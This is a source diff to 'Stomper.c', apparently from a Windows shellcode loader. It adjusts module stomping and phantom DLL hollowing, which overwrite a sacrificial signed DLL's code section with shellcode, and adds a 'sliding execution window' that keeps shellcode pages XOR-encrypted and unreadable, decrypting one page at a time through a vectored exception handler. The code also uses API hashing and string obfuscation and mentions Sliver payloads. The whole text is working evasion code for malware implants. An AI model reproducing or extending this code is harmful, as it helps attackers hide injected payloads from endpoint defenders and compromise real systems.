@@ -1,6 +1,7 @@
 // =============================================
 // Stomper.c - Module Stomping, Phantom DLL Hollowing,
-//             Call Gadget Discovery
+//             Call Gadget Discovery,
+//             Sliding Execution Window
 // =============================================
 
 #include "Common.h"
@@ -49,6 +50,10 @@ PVOID FindCallGadget(IN PVOID pModuleBase) {
 // Loads a sacrificial DLL and overwrites its
 // executable section with shellcode, so the
 // shellcode memory is attributed to a signed DLL.
+//
+// Memory protection is controlled by SHELLCODE_EXEC_PROT:
+//   RWX_SHELLCODE defined:   PAGE_EXECUTE_READWRITE (Go/Sliver)
+//   RWX_SHELLCODE undefined: PAGE_EXECUTE_READ (W^X)
 // -----------------------------------------------
 BOOL ModuleStomp(
     IN  PAPI_HASHING pApi,
@@ -95,7 +100,7 @@ BOOL ModuleStomp(
         return FALSE;
     }
 
-    // Change protection to RW
+    // Change protection to RW for writing
     DWORD dwOldProtect = 0;
     if (!pApi->pVirtualProtect(pTextBase, (SIZE_T)dwShellcodeSize, PAGE_READWRITE, &dwOldProtect)) {
         LOG("[!] Module stomp: VirtualProtect(RW) failed");
@@ -105,10 +110,10 @@ BOOL ModuleStomp(
     // Overwrite .text with shellcode
     MemCopy(pTextBase, pShellcode, dwShellcodeSize);
 
-    // Change to RWX (required for Go-based shellcode like Sliver that writes to own pages)
+    // Set final execution protection (RX or RWX depending on build config)
     DWORD dwDummy = 0;
-    if (!pApi->pVirtualProtect(pTextBase, (SIZE_T)dwShellcodeSize, PAGE_EXECUTE_READWRITE, &dwDummy)) {
-        LOG("[!] Module stomp: VirtualProtect(RWX) failed");
+    if (!pApi->pVirtualProtect(pTextBase, (SIZE_T)dwShellcodeSize, SHELLCODE_EXEC_PROT, &dwDummy)) {
+        LOG("[!] Module stomp: VirtualProtect(exec) failed");
         return FALSE;
     }
 
@@ -344,9 +349,9 @@ BOOL PhantomDllHollow(
         return FALSE;
     }
 
-    // --- Change .text protection to RWX ---
+    // --- Change .text protection to executable ---
     // SEC_IMAGE maps with PE section header protections (typically RX).
-    // Sliver/Go shellcode needs RWX to write to its own pages.
+    // SHELLCODE_EXEC_PROT selects RX or RWX based on build config.
 
     PVOID  pTextAddr  = (PVOID)((PBYTE)pBase + dwTextVA);
     SIZE_T sProtSize  = (SIZE_T)dwShellcodeSize;
@@ -357,7 +362,7 @@ BOOL PhantomDllHollow(
         (ULONG_PTR)(HANDLE)-1,
         (ULONG_PTR)&pTextAddr,
         (ULONG_PTR)&sProtSize,
-        (ULONG_PTR)PAGE_EXECUTE_READWRITE,
+        (ULONG_PTR)SHELLCODE_EXEC_PROT,
         (ULONG_PTR)&dwOldProt,
         0, 0, 0, 0, 0, 0, 0
     );
@@ -370,3 +375,150 @@ BOOL PhantomDllHollow(
     LOG("[+] Phantom DLL hollowing: shellcode mapped via transacted section");
     return TRUE;
 }
+
+// =============================================
+// Sliding Execution Window
+//
+// Only one page of shellcode is decrypted in memory
+// at any given time. All other pages are XOR-encrypted
+// and set to PAGE_NOACCESS. A VEH handler catches
+// access violations within the shellcode range and
+// decrypts the faulting page on demand while
+// re-encrypting the previous page.
+//
+// Requires: non-Go shellcode (W^X compatible)
+// Enabled:  #define SLIDING_WINDOW in Common.h
+// =============================================
+
+#ifdef SLIDING_WINDOW
+
+#define SW_PAGE_SIZE   4096
+#define SW_MAX_PAGES   256      // 256 pages = 1 MB max shellcode
+
+// Sliding window state
+static PVOID            g_pSwBase      = NULL;
+static DWORD            g_dwSwSize     = 0;
+static BYTE             g_SwPageKeys[SW_MAX_PAGES];
+static volatile LONG    g_lSwCurPage   = -1;
+static PVOID            g_hSwVeh       = NULL;
+static fnVirtualProtect g_pSwVP        = NULL;
+
+// XOR encrypt/decrypt a page in place
+static void SwXorPage(PBYTE pPage, DWORD dwSize, BYTE bKey) {
+    for (DWORD i = 0; i < dwSize; i++)
+        pPage[i] ^= bKey;
+}
+
+// -----------------------------------------------
+// VEH Handler for Sliding Execution Window
+//
+// Intercepts STATUS_ACCESS_VIOLATION within the
+// shellcode range. Re-encrypts the previous page
+// and decrypts the faulting page.
+// -----------------------------------------------
+static LONG WINAPI SlidingWindowVehHandler(PEXCEPTION_POINTERS pExInfo) {
+
+    if (pExInfo->ExceptionRecord->ExceptionCode != STATUS_ACCESS_VIOLATION)
+        return EXCEPTION_CONTINUE_SEARCH;
+
+    // ExceptionInformation[1] = faulting address
+    ULONG_PTR uFaultAddr = pExInfo->ExceptionRecord->ExceptionInformation[1];
+
+    // Check if fault is within our shellcode range
+    if (uFaultAddr < (ULONG_PTR)g_pSwBase ||
+        uFaultAddr >= (ULONG_PTR)g_pSwBase + g_dwSwSize)
+        return EXCEPTION_CONTINUE_SEARCH;
+
+    LONG lFaultPage = (LONG)((uFaultAddr - (ULONG_PTR)g_pSwBase) / SW_PAGE_SIZE);
+    LONG lCurPage   = g_lSwCurPage;
+    DWORD dwOld     = 0;
+
+    // Re-encrypt and lock the previously decrypted page
+    if (lCurPage >= 0 && lCurPage != lFaultPage) {
+        PBYTE pOldPage   = (PBYTE)g_pSwBase + lCurPage * SW_PAGE_SIZE;
+        DWORD dwOldSize  = g_dwSwSize - lCurPage * SW_PAGE_SIZE;
+        if (dwOldSize > SW_PAGE_SIZE) dwOldSize = SW_PAGE_SIZE;
+
+        g_pSwVP(pOldPage, dwOldSize, PAGE_READWRITE, &dwOld);
+        SwXorPage(pOldPage, dwOldSize, g_SwPageKeys[lCurPage]);
+        g_pSwVP(pOldPage, dwOldSize, PAGE_NOACCESS, &dwOld);
+    }
+
+    // Decrypt and unlock the faulting page
+    PBYTE pNewPage   = (PBYTE)g_pSwBase + lFaultPage * SW_PAGE_SIZE;
+    DWORD dwNewSize  = g_dwSwSize - lFaultPage * SW_PAGE_SIZE;
+    if (dwNewSize > SW_PAGE_SIZE) dwNewSize = SW_PAGE_SIZE;
+
+    g_pSwVP(pNewPage, dwNewSize, PAGE_READWRITE, &dwOld);
+    SwXorPage(pNewPage, dwNewSize, g_SwPageKeys[lFaultPage]);
+    g_pSwVP(pNewPage, dwNewSize, PAGE_EXECUTE_READ, &dwOld);
+
+    g_lSwCurPage = lFaultPage;
+    return EXCEPTION_CONTINUE_EXECUTION;
+}
+
+// -----------------------------------------------
+// Activate Sliding Window on the shellcode region
+//
+// Encrypts all pages with random per-page XOR keys,
+// sets them to PAGE_NOACCESS, and registers the VEH.
+// -----------------------------------------------
+BOOL ActivateSlidingWindow(
+    IN PAPI_HASHING pApi,
+    IN PVOID        pExecBase,
+    IN DWORD        dwSize
+) {
+    if (!pApi || !pExecBase || dwSize == 0)
+        return FALSE;
+
+    DWORD dwNumPages = (dwSize + SW_PAGE_SIZE - 1) / SW_PAGE_SIZE;
+    if (dwNumPages > SW_MAX_PAGES)
+        return FALSE;
+
+    g_pSwBase   = pExecBase;
+    g_dwSwSize  = dwSize;
+    g_pSwVP     = pApi->pVirtualProtect;
+    g_lSwCurPage = -1;
+
+    // Generate random per-page XOR keys using RDTSC
+    for (DWORD i = 0; i < dwNumPages; i++) {
+        g_SwPageKeys[i] = (BYTE)((__rdtsc() >> (i & 7)) & 0xFF);
+        if (g_SwPageKeys[i] == 0) g_SwPageKeys[i] = 0x41;
+    }
+
+    // Encrypt all pages and set to NOACCESS
+    for (DWORD i = 0; i < dwNumPages; i++) {
+        PBYTE pPage     = (PBYTE)pExecBase + i * SW_PAGE_SIZE;
+        DWORD dwPageSize = dwSize - i * SW_PAGE_SIZE;
+        if (dwPageSize > SW_PAGE_SIZE) dwPageSize = SW_PAGE_SIZE;
+
+        DWORD dwOld;
+        g_pSwVP(pPage, dwPageSize, PAGE_READWRITE, &dwOld);
+        SwXorPage(pPage, dwPageSize, g_SwPageKeys[i]);
+        g_pSwVP(pPage, dwPageSize, PAGE_NOACCESS, &dwOld);
+    }
+
+    // Register VEH handler (first in chain)
+    BYTE xNtdll[] = XSTR_NTDLL_DLL;
+    DEOBF(xNtdll);
+    PVOID pNtdll = (PVOID)pApi->pGetModuleHandleA((LPCSTR)xNtdll);
+    if (!pNtdll)
+        return FALSE;
+
+    BYTE xVeh[] = XSTR_RTL_ADD_VEH;
+    DEOBF(xVeh);
+    fnRtlAddVectoredExceptionHandler pRtlAddVeh =
+        (fnRtlAddVectoredExceptionHandler)pApi->pGetProcAddress(
+            (HMODULE)pNtdll, (LPCSTR)xVeh);
+    if (!pRtlAddVeh)
+        return FALSE;
+
+    g_hSwVeh = pRtlAddVeh(1, (PVOID)SlidingWindowVehHandler);
+    if (!g_hSwVeh)
+        return FALSE;
+
+    LOG("[+] Sliding window: activated, all pages encrypted");
+    return TRUE;
+}
+
+#endif // SLIDING_WINDOW
